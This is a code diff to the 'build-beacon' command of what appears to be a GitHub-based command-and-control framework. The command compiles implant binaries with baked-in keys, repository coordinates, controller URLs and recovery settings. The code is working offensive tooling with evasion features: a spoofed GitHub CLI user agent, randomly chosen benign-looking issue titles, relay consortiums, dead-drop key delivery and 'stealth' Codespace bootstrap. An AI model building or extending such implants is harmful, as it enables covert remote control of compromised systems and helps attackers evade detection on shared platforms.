@@ -14,18 +14,25 @@
  *   process.env.OCTOC2_BEACON_ID
  *   process.env.OCTOC2_BEACON_PUBKEY
  *   process.env.OCTOC2_BEACON_SECKEY
- *   process.env.OCTOC2_GITHUB_TOKEN
  *   process.env.OCTOC2_REPO_OWNER
  *   process.env.OCTOC2_REPO_NAME
  *   process.env.OCTOC2_RELAY_CONSORTIUM  (JSON array, only if --relay used)
  *   process.env.SVC_HTTP_URL             (only if --http-url used)
+ *   process.env.OCTOC2_RECOVERY_*         (public bootstrap values, when configured)
  */
 
 import path from "path";
 import { hostname as osHostname } from "os";
-import { resolveEnv } from "../lib/env.ts";
+import { mkdir, writeFile } from "node:fs/promises";
 import { generateOperatorKeyPair, bytesToBase64 } from "../lib/crypto.ts";
 import { loadTitleTemplates, pickIssueTitle, TitleContext } from "../lib/titleTemplates.ts";
+import {
+  decodeBase64Url,
+  ed25519KeyId,
+  encodeBase64Url,
+  generateEd25519KeyPair,
+} from "@octoc2/shared";
+import { normalizeHttpsControllerUrl } from "../lib/controllerUrl.ts";
 
 export interface RelayEntry {
   account: string;
@@ -36,22 +43,27 @@ export interface BuildBeaconDefinesInput {
   beaconId: string;
   publicKeyB64: string;
   secretKeyB64: string;
-  token: string;
+  signingPublicKeyB64: string;
+  signingSecretKeyB64: string;
+  signingKeyId: string;
   owner: string;
   repo: string;
   relayConsortium: RelayEntry[];
   issueTitle?: string;
-  /** Numeric GitHub App ID — baked as SVC_APP_ID (not secret; key delivered via dead-drop) */
-  appId?: number;
-  /** Installation ID for the C2 repo — baked as SVC_INSTALLATION_ID */
-  installationId?: number;
-  /** GitHub Codespace name to bake in (SVC_GRPC_CODESPACE_NAME). Enables stealth gRPC bootstrap. */
+  recoveryBootstrap?: {
+    owner: string;
+    repo: string;
+    ref: string;
+    signingPublicKey: string;
+    signingKeyId: string;
+  };
+  /** Non-secret Codespace name to bake in (SVC_GRPC_CODESPACE_NAME). */
   codespaceName?: string;
   /** GitHub username for Codespace SSH auth (SVC_GITHUB_USER). */
   githubUser?: string;
   /** Tentacle priority to bake in (SVC_TENTACLE_PRIORITY). e.g. "codespaces,issues" */
   tentaclePriority?: string;
-  /** Public gRPC URL to bake in (SVC_GRPC_DIRECT). e.g. "https://name-50051.app.github.dev" */
+  /** Direct TLS gRPC endpoint whose hostname matches the server certificate SAN. */
   grpcUrl?: string;
   /** Base HTTP URL to bake in (SVC_HTTP_URL). e.g. "https://codespace-8080.app.github.dev" */
   httpUrl?: string;
@@ -63,11 +75,9 @@ export function buildBeaconDefines(input: BuildBeaconDefinesInput): Record<strin
     "process.env.OCTOC2_BEACON_ID": input.beaconId,
     "process.env.OCTOC2_BEACON_PUBKEY": input.publicKeyB64,
     "process.env.OCTOC2_BEACON_SECKEY": input.secretKeyB64,
-    "process.env.OCTOC2_GITHUB_TOKEN": input.token,
-    // Also bake as GITHUB_TOKEN so ActionsTentacle.isActionsAvailable() passes.
-    // This allows the Actions Variables API channel to work from any environment,
-    // not just inside GitHub Actions workflows.
-    "process.env.GITHUB_TOKEN": input.token,
+    "process.env.OCTOC2_BEACON_SIGN_PUBKEY": input.signingPublicKeyB64,
+    "process.env.OCTOC2_BEACON_SIGN_SECKEY": input.signingSecretKeyB64,
+    "process.env.OCTOC2_BEACON_SIGN_KEY_ID": input.signingKeyId,
     "process.env.OCTOC2_REPO_OWNER": input.owner,
     "process.env.OCTOC2_REPO_NAME": input.repo,
     "process.env.OCTOC2_USER_AGENT": "GitHub CLI/gh/2.48.0 (linux; amd64) go/1.23.0",
@@ -79,14 +89,6 @@ export function buildBeaconDefines(input: BuildBeaconDefinesInput): Record<strin
   }
   if (input.issueTitle !== undefined) {
     defines["process.env.SVC_ISSUE_TITLE"] = input.issueTitle;
-  }
-  // App ID and installation ID are not secret — safe to bake into binary.
-  // Private key is always delivered at runtime via dead-drop (never baked).
-  if (input.appId !== undefined) {
-    defines["process.env.SVC_APP_ID"] = String(input.appId);
-  }
-  if (input.installationId !== undefined) {
-    defines["process.env.SVC_INSTALLATION_ID"] = String(input.installationId);
   }
   // Codespace SSH tunnel — all three are non-secret runtime config.
   if (input.codespaceName !== undefined) {
@@ -103,7 +105,22 @@ export function buildBeaconDefines(input: BuildBeaconDefinesInput): Record<strin
     defines["process.env.SVC_GRPC_DIRECT"] = input.grpcUrl;
   }
   if (input.httpUrl !== undefined) {
-    defines["process.env.SVC_HTTP_URL"] = input.httpUrl;
+    defines["process.env.SVC_HTTP_URL"] = normalizeHttpsControllerUrl(
+      input.httpUrl,
+      "--http-url",
+    );
+  }
+  if (input.recoveryBootstrap !== undefined) {
+    defines["process.env.OCTOC2_RECOVERY_REPO_OWNER"] =
+      input.recoveryBootstrap.owner;
+    defines["process.env.OCTOC2_RECOVERY_REPO_NAME"] =
+      input.recoveryBootstrap.repo;
+    defines["process.env.OCTOC2_RECOVERY_REPO_REF"] =
+      input.recoveryBootstrap.ref;
+    defines["process.env.OCTOC2_RECOVERY_SIGNING_PUBLIC_KEY"] =
+      input.recoveryBootstrap.signingPublicKey;
+    defines["process.env.OCTOC2_RECOVERY_SIGNING_KEY_ID"] =
+      input.recoveryBootstrap.signingKeyId;
   }
   return defines;
 }
@@ -116,42 +133,113 @@ export interface BuildBeaconOptions {
   target: string;
   /** When true (default), pick a random benign issue title from the template file. */
   randomTitle?: boolean; // undefined treated as true — commander --no-random-title sets false
-  /** Numeric GitHub App ID to bake in (SVC_APP_ID). Key delivered separately via dead-drop. */
-  appId?: number;
-  /** Installation ID to bake in (SVC_INSTALLATION_ID). */
-  installationId?: number;
-  /** GitHub Codespace name to bake in — enables stealth gRPC bootstrap on first run. */
+  /** Non-secret GitHub Codespace name to bake in. */
   codespaceName?: string;
   /** GitHub username for Codespace SSH auth. */
   githubUser?: string;
   /** Tentacle priority to bake in. e.g. "codespaces,issues" */
   tentaclePriority?: string;
-  /** Public gRPC URL (SVC_GRPC_DIRECT). e.g. "https://name-50051.app.github.dev" or cloudflared URL. */
+  /** Direct TLS gRPC endpoint (SVC_GRPC_DIRECT) with a certificate-valid hostname. */
   grpcUrl?: string;
   /** Base HTTP URL for HttpTentacle (SVC_HTTP_URL). e.g. "https://codespace-8080.app.github.dev" */
   httpUrl?: string;
+  /** Public enrollment artifact path (defaults to <outfile>.enrollment.json). */
+  enrollmentOutfile?: string;
+}
+
+const CANONICAL_BEACON_ID =
+  /^[0-9a-f]{8}-[0-9a-f]{4}-[1-8][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/;
+
+export function validateBuildBeaconId(value: string): string {
+  if (!CANONICAL_BEACON_ID.test(value)) {
+    throw new Error("Beacon ID must be a canonical lowercase UUID");
+  }
+  return value;
 }
 
 /** Minimal env resolution for build-beacon — only needs token/owner/repo, no operator secret. */
 async function resolveBuildEnv() {
-  const token = process.env["OCTOC2_GITHUB_TOKEN"]?.trim();
   const owner = process.env["OCTOC2_REPO_OWNER"]?.trim();
   const repo  = process.env["OCTOC2_REPO_NAME"]?.trim();
   const missing: string[] = [];
-  if (!token) missing.push("OCTOC2_GITHUB_TOKEN");
   if (!owner) missing.push("OCTOC2_REPO_OWNER");
   if (!repo)  missing.push("OCTOC2_REPO_NAME");
   if (missing.length > 0) throw new Error(`Missing required environment variables: ${missing.join(", ")}`);
-  return { token: token!, owner: owner!, repo: repo! };
+
+  const recoveryOwner =
+    process.env["OCTOC2_RECOVERY_REPO_OWNER"]?.trim();
+  const recoveryRepo =
+    process.env["OCTOC2_RECOVERY_REPO_NAME"]?.trim();
+  const recoveryRef =
+    process.env["OCTOC2_RECOVERY_REPO_REF"]?.trim();
+  const recoverySigningPublicKey =
+    process.env["OCTOC2_RECOVERY_SIGNING_PUBLIC_KEY"]?.trim();
+  const recoverySigningKeyId =
+    process.env["OCTOC2_RECOVERY_SIGNING_KEY_ID"]?.trim();
+  const recoveryValues = [
+    recoveryOwner,
+    recoveryRepo,
+    recoveryRef,
+    recoverySigningPublicKey,
+    recoverySigningKeyId,
+  ];
+  const recoveryProvided = recoveryValues.filter(Boolean).length;
+  if (recoveryProvided !== 0 && recoveryProvided !== recoveryValues.length) {
+    throw new Error(
+      "OCTOC2 recovery repository and signing trust values must all be set",
+    );
+  }
+  if (recoveryProvided === recoveryValues.length) {
+    if (
+      !/^[A-Za-z0-9_.-]+$/.test(recoveryOwner!) ||
+      !/^[A-Za-z0-9_.-]+$/.test(recoveryRepo!) ||
+      recoveryRef!.startsWith("/") ||
+      recoveryRef!.endsWith("/") ||
+      recoveryRef!.includes("..") ||
+      recoveryRef!.includes("\\") ||
+      !/^[A-Za-z0-9_./-]+$/.test(recoveryRef!)
+    ) {
+      throw new Error("Recovery repository coordinates/ref are invalid");
+    }
+    const signingPublicKey = await decodeBase64Url(
+      recoverySigningPublicKey!,
+    );
+    if (
+      signingPublicKey.length !== 32 ||
+      await ed25519KeyId(signingPublicKey) !== recoverySigningKeyId
+    ) {
+      throw new Error("Recovery signing public key/key ID are invalid");
+    }
+  }
+
+  return {
+    owner: owner!,
+    repo: repo!,
+    ...(recoveryProvided === recoveryValues.length && {
+      recoveryBootstrap: {
+        owner: recoveryOwner!,
+        repo: recoveryRepo!,
+        ref: recoveryRef!,
+        signingPublicKey: recoverySigningPublicKey!,
+        signingKeyId: recoverySigningKeyId!,
+      },
+    }),
+  };
 }
 
 export async function runBuildBeacon(opts: BuildBeaconOptions): Promise<void> {
   const env = await resolveBuildEnv();
 
-  const beaconId = opts.beaconId?.trim() || crypto.randomUUID();
+  const beaconId = opts.beaconId === undefined
+    ? crypto.randomUUID()
+    : validateBuildBeaconId(opts.beaconId);
   const kp = await generateOperatorKeyPair();
   const pubB64 = await bytesToBase64(kp.publicKey);
   const secB64 = await bytesToBase64(kp.secretKey);
+  const signingKeys = await generateEd25519KeyPair();
+  const signingPublicKeyB64 = encodeBase64Url(signingKeys.publicKey);
+  const signingSecretKeyB64 = encodeBase64Url(signingKeys.secretKey);
+  const signingKeyId = await ed25519KeyId(signingKeys.publicKey);
 
   // Parse relay entries: each is "account/repo"
   const relayConsortium: RelayEntry[] = opts.relay.map((r) => {
@@ -182,13 +270,16 @@ export async function runBuildBeacon(opts: BuildBeaconOptions): Promise<void> {
     beaconId,
     publicKeyB64: pubB64,
     secretKeyB64: secB64,
-    token: env.token,
+    signingPublicKeyB64,
+    signingSecretKeyB64,
+    signingKeyId,
     owner: env.owner,
     repo: env.repo,
     relayConsortium,
+    ...(env.recoveryBootstrap !== undefined && {
+      recoveryBootstrap: env.recoveryBootstrap,
+    }),
     ...(issueTitle            !== undefined && { issueTitle }),
-    ...(opts.appId            !== undefined && { appId:           opts.appId }),
-    ...(opts.installationId   !== undefined && { installationId:  opts.installationId }),
     ...(opts.codespaceName    !== undefined && { codespaceName:   opts.codespaceName }),
     ...(opts.githubUser       !== undefined && { githubUser:      opts.githubUser }),
     ...(opts.tentaclePriority !== undefined && { tentaclePriority: opts.tentaclePriority }),
@@ -257,18 +348,31 @@ export async function runBuildBeacon(opts: BuildBeaconOptions): Promise<void> {
     process.exit(1);
   }
 
+  const enrollmentOutfile = path.resolve(
+    opts.enrollmentOutfile ?? `${opts.outfile}.enrollment.json`,
+  );
+  await mkdir(path.dirname(enrollmentOutfile), { recursive: true });
+  await writeFile(
+    enrollmentOutfile,
+    JSON.stringify({
+      version: 1,
+      beaconId,
+      encryptionPublicKey: pubB64,
+      signingPublicKey: signingPublicKeyB64,
+      signingKeyId,
+      createdAt: new Date().toISOString(),
+    }, null, 2),
+    "utf8",
+  );
+
   console.log("");
   console.log(`  ${GREEN}✓${RESET} Beacon binary: ${opts.outfile}`);
   console.log(`  ${DIM}Beacon ID:${RESET}  ${beaconId}`);
   console.log(`  ${DIM}Public key:${RESET} ${pubB64}`);
+  console.log(`  ${DIM}Signing key:${RESET} ${signingKeyId}`);
+  console.log(`  ${DIM}Enrollment:${RESET} ${enrollmentOutfile}`);
   if (relayConsortium.length > 0) {
     console.log(`  ${DIM}Relay:${RESET}      ${relayConsortium.length} configured`);
-  }
-  if (opts.appId !== undefined) {
-    console.log(`  ${DIM}App ID:${RESET}     ${opts.appId} (baked)`);
-  }
-  if (opts.installationId !== undefined) {
-    console.log(`  ${DIM}Install ID:${RESET} ${opts.installationId} (baked)`);
   }
   if (opts.grpcUrl !== undefined) {
     console.log(`  ${DIM}gRPC URL:${RESET}   ${opts.grpcUrl} (baked)`);
@@ -283,15 +387,6 @@ export async function runBuildBeacon(opts: BuildBeaconOptions): Promise<void> {
     console.log(`  ${DIM}Priority:${RESET}   ${opts.tentaclePriority ?? "auto-detect"} (baked)`);
   }
   console.log("");
-  console.log(`  ${BOLD}To pre-position a dead-drop:${RESET}`);
-  if (opts.appId !== undefined) {
-    console.log(
-      `  octoctl drop create --beacon ${beaconId.slice(0, 8)} --app-key-file ~/.config/svc/app-key.pem`
-    );
-  } else {
-    console.log(
-      `  octoctl drop create --beacon ${beaconId.slice(0, 8)} --server-url https://myserver:8080`
-    );
-  }
+  console.log(`  ${BOLD}Next:${RESET} import the enrollment artifact into the server before deployment.`);
   console.log("");
 }
